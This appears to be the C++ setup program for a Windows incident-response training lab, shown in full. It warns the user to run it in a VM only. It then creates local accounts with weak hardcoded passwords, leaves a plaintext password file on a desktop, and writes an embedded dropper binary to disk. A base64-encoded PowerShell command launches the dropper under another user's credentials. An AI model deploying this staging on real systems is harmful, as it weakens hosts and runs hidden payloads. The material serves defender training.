#include "prep.hpp"

std::string componentName = "prep";

int wmain()
{
    MsgBoxWarning();

    std::filesystem::create_directory(L"C:\\Temp");
    std::filesystem::permissions(L"C:\\Temp", std::filesystem::perms::all);
    
    Log("[+] Starting " + componentName + ".", componentName);
    Log("[*] Running as " + GetUserAndContext(), componentName);
    
    CreateUser(L"NineBall", L"SuperSecurePassword1!");
    CreateUser(L"Raven", L"Password1!");
    CreateUser(L"Rusty", L"Password2@");
    CreateUser(L"Snail", L"Password3#");
    CreateUser(L"Hawkins", L"Password4$");
    CreateUser(L"Maeterlinck", L"Password5%");
    CreateUser(L"Swinburne", L"Password6^");
    CreateUser(L"Pater", L"Password7&");

    // create password doc
    if (!CreateDirectoryW(L"C:\\Users\\NineBall", NULL)) {
        Log("[!] Failed to create NineBall user directory." + std::to_string(GetLastError()), componentName);
    }
    if (!CreateDirectoryW(L"C:\\Users\\NineBall\\Desktop", NULL)) {
        Log("[!] Failed to create NineBall desktop directory" + std::to_string(GetLastError()), componentName);
    }
    std::ofstream fs("C:\\Users\\NineBall\\Desktop\\notmypasswords.txt");
    if (!fs) {
        Log("[!] Failed to create NineBall password document.", componentName);
    }
    else {
        fs << "steam : 7sbV9%J1NnPcqxIr\n";
        fs << "email : d35L9#iEZnfrt$KT\n";
        fs << "confluence : N8k9u&KG008jV##%\n";
        fs << "github : 6wR02Dk$LgQIuonX\n";
        fs << "jira : 4l78J@rV6pyAEPFF\n";
        fs << "discord : O4w03Hf@G9gcbs2V\n";
        fs << "vpn : #6Evd1*2G*1jmVyI\n";
        fs << "homelab : SuperSecurePassword1!";
        fs.close();
    }

    // write the dropper to disk
    Log("[+] Dropping dropper to disk.", componentName);
    std::ofstream outfile("C:\\Temp\\dropper.exe", std::ios::out | std::ios::binary);
    outfile.write(&dropper[0], sizeof(dropper)); // try catch?
    outfile.close();

    // create dropper process as user Raven
    Log("[+] Creating dropper process as Raven.", componentName);

    // powershell.exe -Command $username = 'Raven'; $password = 'Password1!';
    // $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
    // $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
    // Start-Process C:\\Temp\\dropper.exe -Credential $credential;
    std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
    
    MsgBoxStart();

    CreateProc("dropper", cmdline);

    // TODO: pop message box saying completed and give activity timestamps

    return 0;
}

void MsgBoxWarning() {
    LPCSTR text = "THIS EXECUTABLE WILL DAMAGE THE COMPUTER IT IS RUN ON.\n\n"
        "Click \"Yes\" to confirm you are running this in a VM.\n"
        "Click \"No\" to exit the program.";
    LPCSTR caption = "Active Cyber Defense Windows IR Lab";
    int msgResp = MessageBoxA(
        NULL,
        text,
        caption,
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2 | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
    );

    if (msgResp == IDNO) {
        exit(0);
    }
}

void CreateUser(std::wstring username, std::wstring password) {
    NET_API_STATUS err = 0;
    DWORD param_err = 0;

    // create user
    USER_INFO_1 user_info;

    user_info.usri1_name = const_cast<LPWSTR>(username.c_str());
    user_info.usri1_password = const_cast<LPWSTR>(password.c_str());
    user_info.usri1_priv = USER_PRIV_USER;
    user_info.usri1_home_dir = const_cast<LPWSTR>(L"");
    user_info.usri1_comment = const_cast<LPWSTR>(L"");
    user_info.usri1_flags = UF_SCRIPT;
    user_info.usri1_script_path = const_cast<LPWSTR>(L"");

    err = NetUserAdd(NULL, // PDC name 
        1, // level 
        (LPBYTE)&user_info, // input buffer 
        &param_err); // parameter in error 

    switch (err)
    {
    case 0:
        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully created.", componentName);
        break;
    case NERR_UserExists:
        Log("[!] User " + std::string(username.begin(), username.end()) + " already exists.", componentName);
        err = 0;
        break;
    case ERROR_INVALID_PARAMETER:
        Log("[!] Invalid parameter error adding user " + std::string(username.begin(), username.end()) + "; parameter index = " + std::to_string(param_err), componentName);
        break;
    default:
        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " : " + std::to_string(err), componentName);
        break;
    }

    // add user to group
    LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
    localgroup_members.lgrmi3_domainandname = const_cast<LPWSTR>(username.c_str());

    err = NetLocalGroupAddMembers(
        NULL,
        username == L"NineBall" ? L"Administrators" : L"Users",
        3,
        (LPBYTE)&localgroup_members,
        1);

    switch (err)
    {
    case 0:
        Log("[+] User " + std::string(username.begin(), username.end()) + " successfully added to local group.", componentName);
        break;
    case ERROR_MEMBER_IN_ALIAS:
        Log("[!] User " + std::string(username.begin(), username.end()) + " already in local group.", componentName);
        err = 0;
        break;
    default:
        Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " to local group: " + std::to_string(err), componentName);
        break;
    }
}

void MsgBoxStart() {
    std::time_t t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::string ts = std::ctime(&t);
    ts.resize(ts.size() - 1);
    ts = "Incident start timestamp (record this!):\n" + ts;
    LPCSTR text = ts.c_str();
    LPCSTR caption = "Active Cyber Defense Windows IR Lab";
    MessageBoxA(
        NULL,
        text,
        caption,
        MB_OK | MB_ICONINFORMATION | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
    );

}